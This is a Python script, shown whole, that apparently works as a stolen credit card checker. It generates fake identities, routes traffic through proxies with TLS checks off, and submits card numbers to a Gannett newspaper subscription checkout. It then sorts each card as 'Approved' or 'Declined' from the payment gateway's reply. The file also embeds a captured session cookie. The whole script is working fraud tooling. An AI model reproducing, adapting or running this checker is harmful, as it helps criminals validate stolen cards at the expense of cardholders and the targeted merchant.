import requests
import json
from httpx import AsyncClient
import random
import string
from faker import Faker

fake = Faker()

used_emails = set()

def random_email():
    chars = string.ascii_lowercase + string.digits + '._'
    
    while True:
        name_length = random.randint(8, 20)
        
        while True:
            name = ''.join(random.choices(chars, k=name_length))
            if not (name.startswith(('.', '_')) or name.endswith(('.', '_'))):
                break
        
        domains = [
            '@gmail.com', 
            '@hotmail.com', 
            '@yahoo.com', 
            '@outlook.com', 
            '@protonmail.com', 
            '@live.com', 
            '@msn.com', 
            '@aol.com',
            '@icloud.com',
            '@mail.com'
        ]
        
        email = name + random.choice(domains)
        
        if email not in used_emails:
            used_emails.add(email)
            return email

def firefly_id():
    return int(f"122298{random.randint(1000,9999)}")

async def chaseccn1(cc,mes,ano,cvv,proxyg):
    email = random_email()
    
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as web:

        req = await web.get('https://randomuser.me/api/1.2/?nat=US')
        user = req.text
        street = user.split('"street":"')[1].split('"')[0]
        city = user.split('"city":"')[1].split('"')[0]
        state1 = user.split('"state":"')[1].split('"')[0]
        zipcode = user.split('"postcode":')[1].split(',')[0]
        phone = user.split('"phone":"')[1].split('"')[0]
        name = user.split('"first":"')[1].split('"')[0]
        last = user.split('"last":"')[1].split('"')[0]
        
        state_mappings = {
            "Alabama": "AL", "Alaska": "AK", "Arizona": "AZ", "Arkansas": "AR",
            "California": "CA", "Colorado": "CO", "Connecticut": "CT", "Delaware": "DE",
            "Florida": "FL", "Georgia": "GA", "Hawaii": "HI", "Idaho": "ID",
            "Illinois": "IL", "Indiana": "IN", "Iowa": "IA", "Kansas": "KS",
            "Kentucky": "KY", "Louisiana": "LA", "Maine": "ME", "Maryland": "MD",
            "Massachusetts": "MA", "Michigan": "MI", "Minnesota": "MN", "Mississippi": "MS",
            "Missouri": "MO", "Montana": "MT", "Nebraska": "NE", "Nevada": "NV",
            "New Hampshire": "NH", "New Jersey": "NJ", "New Mexico": "NM", "NY": "NY",
            "North Carolina": "NC", "North Dakota": "ND", "Ohio": "OH", "Oklahoma": "OK",
            "Oregon": "OR", "Pennsylvania": "PA", "Rhode Island": "RI", "South Carolina": "SC",
            "South Dakota": "SD", "Tennessee": "TN", "Texas": "TX", "Utah": "UT",
            "Vermont": "VT", "Virginia": "VA", "Washington": "WA", "West Virginia": "WV",
            "Wisconsin": "WI", "Wyoming": "WY"
        }

        state = state_mappings.get(state1.capitalize(), "SD")

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'gup_anonid=38b8443b-8f8c-4ce3-8efb-38ec1f45ed89; gup_clientid=bd6d6c0f-f4fe-4b95-9fb0-36d3af091596; gnt_ub=25; gnt_sb=5; gnt_eid=AnonInfinityLow:5:out-market; gnt_i=95559330975307879928*8151*MX~SON; _ga=GA1.1.2062508495.1734216270; gca_rs=social; cto_bundle=qvyfjF9TZGJDcEpuUkRTaUV3U0lTUDh6V0pQYSUyRmRjWnlacGglMkZJV083JTJCcCUyRjVBV3hEZ2haUG5yMjJNMTVTVmJaWmRYRFR3TXZzV3ByREJrbDZ3QjFXSSUyQldMdlZPdFlyYTZrQlJHNjg0aTdWRHduSDRJQzI3SyUyRnlTb2RNY084aXpMcmc4aDZhYWNDbCUyQnYzekR5JTJCSiUyRnJsQ28zTVVPZEhydCUyRms3TXNTTEtUWjNiZWlhanFObFVHdmV0UmVyWTl3Q0E4ZWVEdjVTVlZkSXJwN0xlNzBWMVE4OUNHMlZvdld5WWpXZDBORkxWNjZYT2tjQWU3YmkzdmNFTDd4MWVjRkVqV2xqUjN0VnpuJTJCbkNDUWFvYjRvcCUyQkxQMWoyUSUzRCUzRA; _parsely_session={%22sid%22:1%2C%22surl%22:%22https://www.coloradoan.com/%22%2C%22sref%22:%22https://www.gannett.com/%22%2C%22sts%22:1734216271788%2C%22slts%22:0}; _parsely_visitor={%22id%22:%22pid=4ec63fd7-af86-4754-b680-1a62de93d337%22%2C%22session_count%22:1%2C%22last_session_ts%22:1734216271788}; __gads=ID=6fbad918e9053b0c:T=1734216271:RT=1734216271:S=ALNI_MYUq88cBrIER7D0lalENJY__xMv5Q; __gpi=UID=00000f73d52ce2a1:T=1734216271:RT=1734216271:S=ALNI_MYpwdK_3ZPFFjYXGYScjtzbbncwXQ; __eoi=ID=a82e5b794eb31205:T=1734216271:RT=1734216271:S=AA-AfjY9ejSxkyrjfVl7UY-888PA; ABTastySession=mrasn=&lp=https%253A%252F%252Fsubscribe.coloradoan.com%252Foffers%253Fgps-source%253DCPMASTHEAD%2526itm_campaign%253D2024HDYFLASHWV1%2526itm_medium%253DONSITE%2526itm_content%253DCPMASTHEAD%2526gnt-eid%253Dcontrol; ABTasty=uid=2ebnqw06z7e82pea&fst=1734216273730&pst=-1&cst=1734216273730&ns=1&pvt=1&pvis=1&th=; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Dec+14+2024+15%3A44%3A35+GMT-0700+(hora+est%C3%A1ndar+del+Pac%C3%ADfico+de+M%C3%A9xico)&version=202410.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&genVendors=V12%3A0%2CV13%3A0%2CV8%3A0%2CV10%3A0%2CV9%3A0%2CV7%3A0%2CV1%3A0%2C&landingPath=https%3A%2F%2Fsubscribe.coloradoan.com%2Foffers%3Fgps-source%3DCPMASTHEAD%26itm_campaign%3D2024HDYFLASHWV1%26itm_medium%3DONSITE%26itm_content%3DCPMASTHEAD%26gnt-eid%3Dcontrol&groups=1%3A1%2C3%3A1%2COSSTA_BG%3A1%2C5%3A1%2C2%3A1%2C4%3A1; sessionKey=sKCjtx2BloAiCR1zKkF043Jlf1nf459FIV-18x2dqz3gZz7LcPcU2CB8PtjMHwx3Dx3DDiJ9jEYMhDq6ML0mPL6TrAx3Dx3D-ivBuEMGx2Fd8aQgSkmI6kvfQx3Dx3D-m3p4NuP5nvgUVANYPO5Yawx3Dx3D; gup_lsid=ba767f813d0049f7aedbfba21bb91890; atyponid=1223149516; gup_lng=%7B%22ret-usr%22%3A%20true%2C%20%22ret-sub%22%3A%20false%2C%20%22auth%22%3A%20true%2C%20%22name%22%3A%20%22asdsad%22%2C%20%22hma%22%3A%20false%2C%20%22lic%22%3A%20%22none%22%2C%20%22lpf%22%3A%20false%2C%20%22updated%22%3A%201734216300%2C%20%223PID%22%3A%20%22b7e3781595e9d2aa8850ee50b2489fef232f6b89812be1c1629eeac4590322a8%22%2C%20%22ips%22%3A%20false%7D; gnt_billsys=Genesys; gps_session=CPMASTHEAD; _ga_5JJXNTWR1D=GS1.1.1734216272.1.1.1734216381.53.0.0',
            'origin': 'https://subscribe.coloradoan.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://subscribe.coloradoan.com/subscribe/?productId=1200095605&genesysSourceCode=W&sourceCode=W&marketId=PFTC&unitNumber=1021&promoCodeOverride=LZ&gps-source=CPMASTHEAD&cards=UserRegistration&expandedSourceCode=CPMASTHEAD&productUsageType=Special%20Offer&rateCode=LZ&publicationCode=CO&fodCode=DS&form-name=UserRegistration',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = 'form-name=CheckoutPrint&cards=UserRegistration&publicationId=&expandedSourceCode=CPMASTHEAD&sourceCode=W&productUsageType=Special+Offer&productId=1200095605&marketId=G2&submarketId=&rateCode=LZ&publicationCode=CO&unitNumber=1021&fodCode=DS&emailConfirm=&passwordConfirm=&firstName=asdsad&gender=&action=&birthYear=&lastName=asdadasd&password=&email=sdjfrsajfndjs%40gmail.com&fireflyUserId=1223149516&gettax-ready=&validate-subscription-ready=&addressLine1=6300+Jericho+Turnpike&addressLine2=&country=US&city=Commack&stateSelect=NY&state=NY&zipCode=11725&phone=(631)+486-7400&startDate=2025-10-18&startDatePhony=Saturday%2C+October+18%2C+2025&accountNumber=0&firstName=asdsad&lastName=asdadasd&billingAddressLine1=6300+Jericho+Turnpike&billingAddressLine2=&billingCountry=US&billingCity=Commack&billing-stateSelect=NY&billingState=NY&billingZipCode=11725&billingPhone=(631)+486-7400&isMatheredRestart=false&method=getTax&isPrint=DigitalPrint'

        req5 = await web.post('https://subscribe.coloradoan.com/billingService/', headers=headers, data=data) #type: ignore


        headers = {
            'accept': 'application/vnd.subscriptions.v2',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://subscribe.coloradoan.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://subscribe.coloradoan.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = [
            ('form-name', 'CheckoutPrint'),
            ('cards', 'UserRegistration'),
            ('publicationId', ''),
            ('expandedSourceCode', 'CPMASTHEAD'),
            ('sourceCode', 'W'),
            ('productUsageType', 'Special Offer'),
            ('productId', '1200095605'),
            ('marketId', 'G2'),
            ('submarketId', ''),
            ('promotionCode', 'LZ'),
            ('publicationCode', 'CO'),
            ('unitNumber', '1029'),
            ('fodCode', 'DS'),
            ('emailConfirm', ''),
            ('passwordConfirm', ''),
            ('firstName', name),
            ('gender', ''),
            ('action', ''),
            ('birthYear', ''),
            ('lastName', last),
            ('password', ''),
            ('email', email),
            ('fireflyUserId', '1223149516'),
            ('gettax-ready', ''),
            ('validate-subscription-ready', 'true'),
            ('addressLine1', '6300 Jericho Turnpike'),
            ('addressLine2', ''),
            ('country', 'US'),
            ('city', 'Commack'),
            ('stateSelect', 'NY'),
            ('state', 'NY'),
            ('zipCode', '11725'),
            ('phone', '6314867400'),
            ('startDate', '20251018'),
            ('startDatePhony', 'Saturday, October 18, 2025'),
            ('accountNumber', '0'),
            ('firstName', name),
            ('lastName', last),
            ('creditCardNumber', cc),
            ('creditCardExpirationMonth', mes),
            ('creditCardExpirationYear', ano),
            ('billingAddressLine1', '6300 Jericho Turnpike'),
            ('billingAddressLine2', ''),
            ('billingCountry', 'US'),
            ('billingCity', 'Commack'),
            ('billing-stateSelect', 'NY'),
            ('billingState', 'NY'),
            ('billingZipCode', '11725'),
            ('billingPhone', '6314867400'),
        ]
        data = dict(data)
        req2 = await web.post('https://subscription-self-serve.gannett.com/createSubscription', headers=headers, data=data)
        print(req2.text)
        await web.aclose()
        
        try:
            if '{"meta":{"status":0,"message":"Success","error":[]}}' in req2.text:
                status = "Approved ✅"
                mensaje = "Approved"
            else:
                if "There is already a pending Start transaction" in req2.text:
                    used_emails.clear()  
                    return await chaseccn1(cc, mes, ano, cvv, proxyg)  
                
                if "PROFILE CREATED" in req2.text:
                    status = "Declined ❌"
                    mensaje = "Profile Created"
                else:
                    try:
                        mensaje = req2.text.split('["merchant_gateway",["')[1].split('"]],')[0]
                        
                        if any(term in mensaje for term in ["Credit Floor", "Insufficient Funds"]):
                            status = "Approved ✅"
                        else:
                            mensaje = mensaje.split(': ')[-1]
                            status = "Declined ❌"
                    except:
                        status = "Error ⚠️"
                        mensaje = "Error in req4"
                    
            return status, mensaje
            
        except Exception as e:
            return "Error ❌", str(e)